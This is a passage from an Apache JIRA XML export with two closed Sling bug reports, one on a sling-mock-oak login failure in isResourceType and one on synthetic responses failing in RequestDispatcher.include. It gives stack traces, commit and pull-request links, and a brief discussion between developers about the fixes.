&lt;p&gt;when calling isResourceType within a service resolver i new resource resolver session is tried to create internally - and this currently fails when using the JCR_OAK resource resolver type with an error like this:&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;java.lang.IllegalStateException: Failed to create resource-type ResourceResolver
at org.apache.sling.resourceresolver.impl.helper.ResourceResolverControl.getResourceTypeResourceResolver(ResourceResolverControl.java:707)
at org.apache.sling.resourceresolver.impl.helper.ResourceResolverControl.getParentResourceType(ResourceResolverControl.java:729)
at org.apache.sling.resourceresolver.impl.ResourceResolverImpl.getParentResourceType(ResourceResolverImpl.java:1028)
at org.apache.sling.resourceresolver.impl.ResourceResolverImpl.getParentResourceType(ResourceResolverImpl.java:1017)
at org.apache.sling.resourceresolver.impl.ResourceResolverImpl.isResourceType(ResourceResolverImpl.java:1045)
at org.apache.sling.api.resource.AbstractResource.isResourceType(AbstractResource.java:121)
at io.wcm.issues.sampleTests.SampleTest.testIsResourceType(SampleTest.java:39)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50)
at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47)
at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
at org.junit.rules.RunRules.evaluate(RunRules.java:20)
at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325)
at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78)
at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57)
at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290)
at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71)
at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288)
at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58)
at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268)
at org.junit.runners.ParentRunner.run(ParentRunner.java:363)
at org.junit.runner.JUnitCore.run(JUnitCore.java:137)
at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:78)
at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:212)
at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:68)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at com.intellij.rt.execution.application.AppMain.main(AppMain.java:140)
Caused by: org.apache.sling.api.resource.LoginException: Login Failure: all modules ignored
at org.apache.sling.jcr.resource.internal.helper.jcr.JcrProviderStateFactory.getLoginException(JcrProviderStateFactory.java:224)
at org.apache.sling.jcr.resource.internal.helper.jcr.JcrProviderStateFactory.createProviderState(JcrProviderStateFactory.java:135)
at org.apache.sling.jcr.resource.internal.helper.jcr.JcrResourceProvider.authenticate(JcrResourceProvider.java:304)
at org.apache.sling.jcr.resource.internal.helper.jcr.JcrResourceProvider.authenticate(JcrResourceProvider.java:76)
at org.apache.sling.resourceresolver.impl.providers.stateful.ProviderManager.authenticate(ProviderManager.java:161)
at org.apache.sling.resourceresolver.impl.providers.stateful.ProviderManager.getOrCreateProvider(ProviderManager.java:87)
at org.apache.sling.resourceresolver.impl.providers.stateful.ProviderManager.authenticateAll(ProviderManager.java:129)
at org.apache.sling.resourceresolver.impl.ResourceResolverImpl.createControl(ResourceResolverImpl.java:142)
at org.apache.sling.resourceresolver.impl.ResourceResolverImpl.&amp;lt;init&amp;gt;(ResourceResolverImpl.java:103)
at org.apache.sling.resourceresolver.impl.ResourceResolverImpl.&amp;lt;init&amp;gt;(ResourceResolverImpl.java:97)
at org.apache.sling.resourceresolver.impl.CommonResourceResolverFactoryImpl.getResourceResolverInternal(CommonResourceResolverFactoryImpl.java:280)
at org.apache.sling.resourceresolver.impl.CommonResourceResolverFactoryImpl.getServiceResourceResolver(CommonResourceResolverFactoryImpl.java:415)
at org.apache.sling.resourceresolver.impl.helper.ResourceResolverControl.getResourceTypeResourceResolver(ResourceResolverControl.java:705)
... 34 more
Caused by: javax.security.auth.login.LoginException: Login Failure: all modules ignored
at javax.security.auth.login.LoginContext.invoke(LoginContext.java:906)
at javax.security.auth.login.LoginContext.access$000(LoginContext.java:195)
at javax.security.auth.login.LoginContext$4.run(LoginContext.java:682)
at javax.security.auth.login.LoginContext$4.run(LoginContext.java:680)
at java.security.AccessController.doPrivileged(Native Method)
at javax.security.auth.login.LoginContext.invokePriv(LoginContext.java:680)
at javax.security.auth.login.LoginContext.login(LoginContext.java:587)
at org.apache.jackrabbit.oak.core.ContentRepositoryImpl.login(ContentRepositoryImpl.java:163)
at org.apache.jackrabbit.oak.jcr.repository.RepositoryImpl.login(RepositoryImpl.java:282)
at org.apache.jackrabbit.oak.jcr.repository.RepositoryImpl.login(RepositoryImpl.java:225)
at org.apache.sling.testing.mock.sling.oak.OakMockSlingRepository.login(OakMockSlingRepository.java:123)
at org.apache.sling.jcr.resource.internal.helper.jcr.JcrProviderStateFactory.createProviderState(JcrProviderStateFactory.java:132)
... 45 more
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13480861">SLING-11572</key>
            <summary>sling-mock-oak: Calling isResourceType() on service resolver throws Login Failure exception</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Fri, 9 Sep 2022 12:32:46 +0000</created>
                <updated>Thu, 15 Sep 2022 16:41:52 +0000</updated>
                            <resolved>Fri, 9 Sep 2022 13:26:38 +0000</resolved>
                                    <version>Testing Sling Mock Oak 3.1.2-1.40.0</version>
                                    <fixVersion>Testing Sling Mock Oak 3.1.4-1.40.0</fixVersion>
                    <fixVersion>Testing Sling Mock 3.4.2</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="3000">50m</timespent>
                                <comments>
                            <comment id="17602321" author="sseifert@pro-vision.de" created="Fri, 9 Sep 2022 12:56:04 +0000"  >&lt;p&gt;root cause information from &lt;a href=&quot;https://wcm-io.atlassian.net/browse/WTES-44?focusedCommentId=21524&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://wcm-io.atlassian.net/browse/WTES-44?focusedCommentId=21524&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;&lt;p&gt;The root cause seem to be here: &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-resourceresolver/blob/ee2a0b2317ec71c3af6e0655cf04487fc7273056/src/main/java/org/apache/sling/resourceresolver/impl/helper/ResourceResolverControl.java#L851&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-resourceresolver/blob/ee2a0b2317ec71c3af6e0655cf04487fc7273056/src/main/java/org/apache/sling/resourceresolver/impl/helper/ResourceResolverControl.java#L851&lt;/a&gt;. This block is executed for non admin resource resolvers.&lt;/p&gt;

&lt;p&gt;The FrameworkUtil.getBundle(ResourceResolverControl.class) call returns null. As the authenticationInfo contains no other authentication information the processing eventually fail in the &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/05e7c605fbb453eb7f75a6f863ac36f3c281f9bf/src/main/java/org/apache/sling/jcr/resource/internal/helper/jcr/JcrProviderStateFactory.java#L97&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;JcrProviderStateFactory&lt;/a&gt;: due to the bundle being null (should be a MockBundle) there will be login attempt on the repository with null Credentials &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-jcr-resource/blob/05e7c605fbb453eb7f75a6f863ac36f3c281f9bf/src/main/java/org/apache/sling/jcr/resource/internal/helper/jcr/JcrProviderStateFactory.java#L131&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;</comment>
                            <comment id="17602339" author="sseifert@pro-vision.de" created="Fri, 9 Sep 2022 13:26:38 +0000"  >&lt;p&gt;implemented a simple workaround:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-sling-mock-oak/commit/b16be8662853bf2e9b9de577a5e9f8f3c769c41d&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-sling-mock-oak/commit/b16be8662853bf2e9b9de577a5e9f8f3c769c41d&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;test cases:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/commit/cc4ea43176ba67b97fc1e4bba71a50de3a71dbb7&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-sling-mock/commit/cc4ea43176ba67b97fc1e4bba71a50de3a71dbb7&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 6 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z18g08:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11569] Response created with Builders.newResponseBuilder() does not work with RequestDispatcher.include</title>
                <link>https://issues.apache.org/jira/browse/SLING-11569</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;scenario:&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;we want to use RequestDispatcher.include to include the output of another servlet running in sling to include it&apos;s output in the output of the current servlet&lt;/li&gt;
	&lt;li&gt;but this should not be done by passing the response of the current servlet directly into the request dispatcher, but by using a &quot;synthetic response&quot; created with the new &lt;a href=&quot;https://sling.apache.org/apidocs/sling12/org/apache/sling/api/request/builder/Builders.html#newResponseBuilder--&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;Builders.newResponseBuilder&lt;/a&gt; feature to be able to validate or post-process the output of the other servlet.&lt;/li&gt;
	&lt;li&gt;when doing this, the include on request dispatcher failes with an exception &quot; SlingHttpServletResponse not of correct type&quot;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;full strack trace:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;java.lang.IllegalArgumentException: SlingHttpServletResponse not of correct type
	at org.apache.sling.engine.impl.request.RequestData.unwrap(RequestData.java:430)
	at org.apache.sling.engine.impl.request.RequestData.toSlingHttpServletResponse(RequestData.java:507)
	at org.apache.sling.engine.impl.SlingRequestProcessorImpl.dispatchRequest(SlingRequestProcessorImpl.java:315)
	at org.apache.sling.engine.impl.request.SlingRequestDispatcher.dispatch(SlingRequestDispatcher.java:218)
	at org.apache.sling.engine.impl.request.SlingRequestDispatcher.include(SlingRequestDispatcher.java:104)
	at org.apache.sling.launchpad.testservices.servlets.requestdispatcher.RequestDispatcherIncludeBufferedServlet.doGet(RequestDispatcherIncludeBufferedServlet.java:64)
	at org.apache.sling.api.servlets.SlingSafeMethodsServlet.mayService(SlingSafeMethodsServlet.java:266)
	at org.apache.sling.api.servlets.SlingSafeMethodsServlet.service(SlingSafeMethodsServlet.java:342)
	at org.apache.sling.api.servlets.SlingSafeMethodsServlet.service(SlingSafeMethodsServlet.java:374)
	at org.apache.sling.engine.impl.request.RequestData.service(RequestData.java:587)
	at org.apache.sling.engine.impl.filter.SlingComponentFilterChain.render(SlingComponentFilterChain.java:45)
	at org.apache.sling.engine.impl.filter.AbstractSlingFilterChain.doFilter(AbstractSlingFilterChain.java:88)
	at org.apache.sling.engine.impl.SlingRequestProcessorImpl.processComponent(SlingRequestProcessorImpl.java:284)
	at org.apache.sling.engine.impl.filter.RequestSlingFilterChain.render(RequestSlingFilterChain.java:49)
	at org.apache.sling.engine.impl.filter.AbstractSlingFilterChain.doFilter(AbstractSlingFilterChain.java:82)
	at org.apache.sling.launchpad.testservices.filters.TestFilter.doFilter(TestFilter.java:47)
	at org.apache.sling.launchpad.testservices.filters.SlingFilter.doFilter(SlingFilter.java:22)
	at org.apache.sling.engine.impl.filter.AbstractSlingFilterChain.doFilter(AbstractSlingFilterChain.java:78)
	at org.apache.sling.launchpad.testservices.filters.TestFilter.doFilter(TestFilter.java:47)
	at org.apache.sling.launchpad.testservices.filters.NoPropertyFilter.doFilter(NoPropertyFilter.java:22)
	at org.apache.sling.engine.impl.filter.AbstractSlingFilterChain.doFilter(AbstractSlingFilterChain.java:78)
	at org.apache.sling.engine.impl.debug.RequestProgressTrackerLogFilter.doFilter(RequestProgressTrackerLogFilter.java:109)
	at org.apache.sling.engine.impl.filter.AbstractSlingFilterChain.doFilter(AbstractSlingFilterChain.java:78)
	at org.apache.sling.i18n.impl.I18NFilter.doFilter(I18NFilter.java:131)
	at org.apache.sling.engine.impl.filter.AbstractSlingFilterChain.doFilter(AbstractSlingFilterChain.java:78)
	at com.composum.sling.nodes.mount.remote.RemoteRequestFilter.doFilter(RemoteRequestFilter.java:76)
	at org.apache.sling.engine.impl.filter.AbstractSlingFilterChain.doFilter(AbstractSlingFilterChain.java:78)
	at org.apache.sling.engine.impl.SlingRequestProcessorImpl.doProcessRequest(SlingRequestProcessorImpl.java:149)
	at org.apache.sling.engine.impl.SlingMainServlet.service(SlingMainServlet.java:251)
	at org.apache.felix.http.base.internal.handler.ServletHandler.handle(ServletHandler.java:126)
	at org.apache.felix.http.base.internal.dispatch.InvocationChain.doFilter(InvocationChain.java:86)
	at org.apache.sling.junit.impl.servlet.TestLogServlet$TestNameLoggingFilter.doFilter(TestLogServlet.java:250)
	at org.apache.felix.http.base.internal.handler.FilterHandler.handle(FilterHandler.java:142)
	at org.apache.felix.http.base.internal.dispatch.InvocationChain.doFilter(InvocationChain.java:81)
	at org.apache.sling.i18n.impl.I18NFilter.doFilter(I18NFilter.java:131)
	at org.apache.felix.http.base.internal.handler.FilterHandler.handle(FilterHandler.java:142)
	at org.apache.felix.http.base.internal.dispatch.InvocationChain.doFilter(InvocationChain.java:81)
	at org.apache.sling.engine.impl.log.RequestLoggerFilter.doFilter(RequestLoggerFilter.java:73)
	at org.apache.felix.http.base.internal.handler.FilterHandler.handle(FilterHandler.java:142)
	at org.apache.felix.http.base.internal.dispatch.InvocationChain.doFilter(InvocationChain.java:81)
	at org.apache.sling.engine.impl.parameters.RequestParameterSupportConfigurer.doFilter(RequestParameterSupportConfigurer.java:67)
	at org.apache.felix.http.base.internal.handler.FilterHandler.handle(FilterHandler.java:142)
	at org.apache.felix.http.base.internal.dispatch.InvocationChain.doFilter(InvocationChain.java:81)
	at org.apache.felix.http.base.internal.dispatch.Dispatcher$1.doFilter(Dispatcher.java:152)
	at org.apache.felix.http.base.internal.whiteboard.WhiteboardManager$2.doFilter(WhiteboardManager.java:1002)
	at org.apache.felix.http.sslfilter.internal.SslFilter.doFilter(SslFilter.java:97)
	at org.apache.felix.http.base.internal.handler.PreprocessorHandler.handle(PreprocessorHandler.java:137)
	at org.apache.felix.http.base.internal.whiteboard.WhiteboardManager$2.doFilter(WhiteboardManager.java:1008)
	at org.apache.felix.http.base.internal.whiteboard.WhiteboardManager.invokePreprocessors(WhiteboardManager.java:1012)
	at org.apache.felix.http.base.internal.dispatch.Dispatcher.dispatch(Dispatcher.java:94)
	at org.apache.felix.http.base.internal.dispatch.DispatcherServlet.service(DispatcherServlet.java:49)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:733)
	at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:799)
	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:550)
	at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:233)
	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:1624)
	at org.eclipse.jetty.server.handler.ScopedHandler.nextHandle(ScopedHandler.java:233)
	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1434)
	at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:188)
	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:501)
	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1594)
	at org.eclipse.jetty.server.handler.ScopedHandler.nextScope(ScopedHandler.java:186)
	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1349)
	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:191)
	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:127)
	at org.eclipse.jetty.server.Server.handle(Server.java:516)
	at org.eclipse.jetty.server.HttpChannel.lambda$handle$1(HttpChannel.java:400)
	at org.eclipse.jetty.server.HttpChannel.dispatch(HttpChannel.java:645)
	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:392)
	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:277)
	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:311)
	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:105)
	at org.eclipse.jetty.io.ChannelEndPoint$1.run(ChannelEndPoint.java:104)
	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:883)
	at org.eclipse.jetty.util.thread.QueuedThreadPool$Runner.run(QueuedThreadPool.java:1034)
	at java.base/java.lang.Thread.run(Thread.java:834)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;the culprit is this code line&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/blob/f8c698a74f3bf798c331d116794fd817ef6a3e3d/src/main/java/org/apache/sling/engine/impl/request/RequestData.java#L506-L507&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/blob/f8c698a74f3bf798c331d116794fd817ef6a3e3d/src/main/java/org/apache/sling/engine/impl/request/RequestData.java#L506-L507&lt;/a&gt;&lt;br/&gt;
which enforces the response is actually a SlingHttpServletResponseImpl from sling engine - although the following code lines are build in a way to handle also other types of response objects.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13480637">SLING-11569</key>
            <summary>Response created with Builders.newResponseBuilder() does not work with RequestDispatcher.include</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Thu, 8 Sep 2022 11:25:38 +0000</created>
                <updated>Mon, 12 Sep 2022 16:37:44 +0000</updated>
                            <resolved>Fri, 9 Sep 2022 09:09:31 +0000</resolved>
                                    <version>Engine 2.10.2</version>
                                    <fixVersion>Engine 2.11.0</fixVersion>
                                    <component>Engine</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="6600">1h 50m</timespent>
                                <comments>
                            <comment id="17601770" author="sseifert@pro-vision.de" created="Thu, 8 Sep 2022 11:30:51 +0000"  >&lt;p&gt;i&apos;ve provided two PRs with an integration test to show the problematic behavior:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-launchpad-test-services/pull/5&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-launchpad-test-services/pull/5&lt;/a&gt;&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-launchpad-integration-tests/pull/9&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-launchpad-integration-tests/pull/9&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;this shows the code that is used to build the &quot;synthetic response&quot; to be used in request dispatcher:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-launchpad-test-services/blob/a06a3b67f6a959ec39051c66ef71fd0376a64e1b/src/main/java/org/apache/sling/launchpad/testservices/servlets/requestdispatcher/RequestDispatcherIncludeBufferedServlet.java#L59-L64&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-launchpad-test-services/blob/a06a3b67f6a959ec39051c66ef71fd0376a64e1b/src/main/java/org/apache/sling/launchpad/testservices/servlets/requestdispatcher/RequestDispatcherIncludeBufferedServlet.java#L59-L64&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&amp;#8212;&lt;/p&gt;

&lt;p&gt;in my pov this code line&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/blob/f8c698a74f3bf798c331d116794fd817ef6a3e3d/src/main/java/org/apache/sling/engine/impl/request/RequestData.java#L506-L507&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/blob/f8c698a74f3bf798c331d116794fd817ef6a3e3d/src/main/java/org/apache/sling/engine/impl/request/RequestData.java#L506-L507&lt;/a&gt;&lt;br/&gt;
which is calling:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/blob/f8c698a74f3bf798c331d116794fd817ef6a3e3d/src/main/java/org/apache/sling/engine/impl/request/RequestData.java#L420-L432&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/blob/f8c698a74f3bf798c331d116794fd817ef6a3e3d/src/main/java/org/apache/sling/engine/impl/request/RequestData.java#L420-L432&lt;/a&gt;&lt;br/&gt;
but does not care about it&apos;s result can be removed.&lt;/p&gt;</comment>
                            <comment id="17601777" author="sseifert@pro-vision.de" created="Thu, 8 Sep 2022 11:45:20 +0000"  >&lt;p&gt;here is my proposal to fix the issue:&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/pull/25&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/pull/25&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; can you take a look?&lt;br/&gt;
the affected code is &lt;b&gt;very&lt;/b&gt; old, coming from 2009 when imported into the sing codebase.&lt;/p&gt;</comment>
                            <comment id="17601783" author="cziegeler" created="Thu, 8 Sep 2022 12:10:49 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; That should be ok; I have the feeling that checking for &quot;impl&quot; not necessary anymore and we could remove it everywhere.&lt;/p&gt;

&lt;p&gt;I think for the response we could change unwrap to just check for the interface instead of the impl.&lt;br/&gt;
For the request it is more tricky as this requires RequestData to be available. So we need the check for impl there (unless we come up with a different solution)&lt;/p&gt;</comment>
                            <comment id="17601844" author="sseifert@pro-vision.de" created="Thu, 8 Sep 2022 14:17:22 +0000"  >&lt;p&gt;in this ticket i would only take care of the response. and this is already checked and probably unwrapped to the interface SlingHttpServletResponse in the code line before&lt;br/&gt;
&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/blob/f8c698a74f3bf798c331d116794fd817ef6a3e3d/src/main/java/org/apache/sling/engine/impl/request/RequestData.java#L506-L507&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/blob/f8c698a74f3bf798c331d116794fd817ef6a3e3d/src/main/java/org/apache/sling/engine/impl/request/RequestData.java#L506-L507&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;so as done in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-engine/pull/25&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-engine/pull/25&lt;/a&gt; i would just remove this code line to solve this ticket.&lt;/p&gt;</comment>
                            <comment id="17601861" author="cziegeler" created="Thu, 8 Sep 2022 14:41:40 +0000"  >&lt;p&gt;makes sense, ok&lt;/p&gt;</comment>
